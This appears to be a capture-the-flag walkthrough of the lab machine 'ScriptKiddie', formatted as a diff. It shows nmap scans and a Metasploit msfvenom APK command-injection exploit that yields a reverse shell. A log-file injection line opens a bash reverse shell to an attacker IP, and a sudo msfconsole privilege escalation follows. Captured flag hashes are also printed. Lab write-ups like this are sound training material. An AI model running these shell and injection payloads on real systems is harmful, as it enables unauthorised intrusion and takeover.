@@ -1,0 +1,266 @@
+Machine-Name  :  ScriptKiddie
+IP-Address    :  10.129.108.80
+
+Command-Line: sudo nmap -A 10.129.108.80
+Result:
+    Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-23 02:33 EST
+    Nmap scan report for 10.129.108.80
+    Host is up (0.051s latency).
+    Not shown: 998 closed ports
+    PORT     STATE SERVICE VERSION
+    22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+    | ssh-hostkey:
+    |   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
+    |   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
+    |_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
+    5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
+    |_http-title: k1d'5 h4ck3r t00l5
+    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+    TCP/IP fingerprint:
+    OS:SCAN(V=7.91%E=4%D=2/23%OT=22%CT=1%CU=36300%PV=Y%DS=2%DC=T%G=Y%TM=6034AFD
+    OS:3%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS
+    OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
+    OS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
+    OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+    OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+    OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+    OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+    OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
+    OS:=S)
+
+    Network Distance: 2 hops
+    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+    TRACEROUTE (using port 995/tcp)
+    HOP RTT      ADDRESS
+    1   51.50 ms 10.10.14.1
+    2   52.78 ms 10.129.108.80
+
+    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+    Nmap done: 1 IP address (1 host up) scanned in 21.51 seconds
+
+
+Command-Line: sudo nmap -p- -A -T4 10.129.108.80
+Result:
+    Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-23 02:33 EST
+    Nmap scan report for 10.129.108.80
+    Host is up (0.051s latency).
+    Not shown: 65533 closed ports
+    PORT     STATE SERVICE VERSION
+    22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+    | ssh-hostkey:
+    |   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
+    |   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
+    |_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
+    5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
+    |_http-title: k1d'5 h4ck3r t00l5
+    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+    TCP/IP fingerprint:
+    OS:SCAN(V=7.91%E=4%D=2/23%OT=22%CT=1%CU=31555%PV=Y%DS=2%DC=T%G=Y%TM=6034B00
+    OS:7%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)OPS
+    OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
+    OS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
+    OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+    OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+    OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+    OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+    OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
+    OS:=S)
+
+    Network Distance: 2 hops
+    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+    TRACEROUTE (using port 21/tcp)
+    HOP RTT      ADDRESS
+    1   52.42 ms 10.10.14.1
+    2   53.33 ms 10.129.108.80
+
+    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+    Nmap done: 1 IP address (1 host up) scanned in 45.78 seconds
+
+
+Browser: http://10.129.108.80:5000
+Notes: Website has "NMAP", "PAYLOADS", and "SPLOITS"
+
+NMAP results:
+    Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-23 07:56 UTC
+    Nmap scan report for 10.129.108.80
+    Host is up (0.000088s latency).
+    Not shown: 98 closed ports
+    PORT     STATE SERVICE
+    22/tcp   open  ssh
+    5000/tcp open  upnp
+
+    Nmap done: 1 IP address (1 host up) scanned in 13.13 seconds
+
+Payload results (Android):
+
+    payload: android/meterpreter/reverse_tcp
+    LHOST: 10.10.14.155
+    LPORT: 4444
+    template: None
+    download: 20c603a4e329.apk
+    expires: 5 mins
+
+
+
+Metasploit: msf6 > search apk
+
+    Matching Modules
+    ================
+
+       #  Name                                                                    Disclosure Date  Rank       Check  Description
+       -  ----                                                                    ---------------  ----       -----  -----------
+       0  auxiliary/admin/android/google_play_store_uxss_xframe_rce                                normal     No     Android Browser RCE Through Google Play Store XFO
+       1  auxiliary/dos/dns/bind_tsig_badtime                                     2020-05-19       normal     No     BIND TSIG Badtime Query Denial of Service
+       2  exploit/android/browser/samsung_knox_smdm_url                           2014-11-12       excellent  No     Samsung Galaxy KNOX Android Browser RCE
+       3  exploit/android/local/janus                                             2017-07-31       manual     Yes    Android Janus APK Signature bypass
+       4  exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection  2020-10-29       excellent  No     Rapid7 Metasploit Framework msfvenom APK Template Command Injection
+       5  exploit/windows/browser/webex_ucf_newobject                             2008-08-06       good       No     WebEx UCF atucfobj.dll ActiveX NewObject Method Buffer Overflow
+       6  exploit/windows/fileformat/vlc_realtext                                 2008-11-05       good       No     VLC Media Player RealText Subtitle Overflow
+
+
+    Interact with a module by name or index. For example info 6, use 6 or use exploit/windows/fileformat/vlc_realtext
+
+    msf6 > use 4
+    [*] No payload configured, defaulting to cmd/unix/reverse_netcat
+    msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > show options
+
+    Module options (exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection):
+
+       Name      Current Setting  Required  Description
+       ----      ---------------  --------  -----------
+       FILENAME  msf.apk          yes       The APK file name
+
+
+    Payload options (cmd/unix/reverse_netcat):
+
+       Name   Current Setting  Required  Description
+       ----   ---------------  --------  -----------
+       LHOST  192.168.0.4      yes       The listen address (an interface may be specified)
+       LPORT  4444             yes       The listen port
+
+       **DisablePayloadHandler: True   (no handler will be created!)**
+
+
+    Exploit target:
+
+       Id  Name
+       --  ----
+       0   Automatic
+
+
+    msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > set lhost tun0
+    lhost => tun0
+    msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > set lport 9001
+    lport => 9001
+    msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > set exploit 0
+    exploit => 0
+    msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > run
+
+    [+] msf.apk stored at /home/kali/.msf4/local/msf.apk
+
+
+
+
+Command-Line: mv /home/kali/.msf4/local/msf.apk ~/home/kali/HTB/Machines/ScriptKiddie_NF
+Command-Line: nc -lvnp 9001
+
+Notes: In the "PAYLOAD" section of http://10.129.108.80:5000, uploaded the .apk file and clicked "generate".
+Result:
+    *** REVERSE SHELL ***
+    *** USER ACCESS ***
+
+Command-Line: whoami
+Result: kid
+
+Command-Line: export TERM=linux
+Command-Line: python3 -c 'import pty; pty.spawn("/bin/bash")'
+Result:
+    kid@scriptkiddie:~/html$
+
+kid@scriptkiddie:~/html$ cd
+kid@scriptkiddie:~$ cat user.txt
+Result: ecfffa4652783eb4dc56e4180723ec20
+    *** USER OWNED ***
+
+
+
+Attempting root access...
+
+
+
+kid@scriptkiddie:/home/pwn$ ls
+recon  scanlosers.sh
+kid@scriptkiddie:/home/pwn$ cat scanlosers.sh
+Result:
+    #!/bin/bash
+
+    log=/home/kid/logs/hackers
+
+    cd /home/pwn/
+    cat $log | cut -d' ' -f3- | sort -u | while read ip; do
+        sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
+    done
+
+    if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
+
+Notes: Storing logs in /home/logs/hackers.
+
+Command-Line: nc -lvnp 9010
+kid@scriptkiddie:~/logs$ echo "  ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.155/9010 0>&1' #" >> hackers
+Result:
+    *** PWN USER ACCESS ***
+    pwn@scriptkiddie:~$
+
+pwn@scriptkiddie:~$ linpeas.sh
+
+    OS: Linux version 5.4.0-65-generic
+
+    [+] Cron jobs
+    [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs
+    # Edit this file to introduce tasks to be run by cron.
+    #
+    # Each task to run has to be defined through a single line
+    # indicating with different fields when the task will be run
+    # and what command to run for the task
+    #
+    # To define the time you can provide concrete values for
+    # minute (m), hour (h), day of month (dom), month (mon),
+    # and day of week (dow) or use '*' in these fields (for 'any').
+    #
+    # Notice that tasks will be started based on the cron's system
+    # daemon's notion of time and timezones.
+    #
+    # Output of the crontab jobs (including errors) is sent through
+    # email to the user the crontab file belongs to (unless redirected).
+    #
+    # For example, you can run a backup of all your user accounts
+    # at 5 a.m every week with:
+    # 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
+    #
+    # For more information see the manual pages of crontab(5) and cron(8)
+    #
+    # m h  dom mon dow   command
+    -rw-r--r-- 1 root root 1042 Feb 13  2020 /etc/crontab
+
+
+pwn@scriptkiddie:~$ sudo -l
+Result:
+    Matching Defaults entries for pwn on scriptkiddie:
+        env_reset, mail_badpass,
+        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+    User pwn may run the following commands on scriptkiddie:
+        (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
+
+
+pwn@scriptkiddie:~$ sudo mfsconsole
+msf6 > cat /root/root.txt
+[*] exec: cat /root/root.txt
+Result: ff18655afed377607a39805b8b440ca5
+    *** ROOT ACCESS ***
+    *** ROOT OWNED ***
+
+
+      *** FINISHED ***
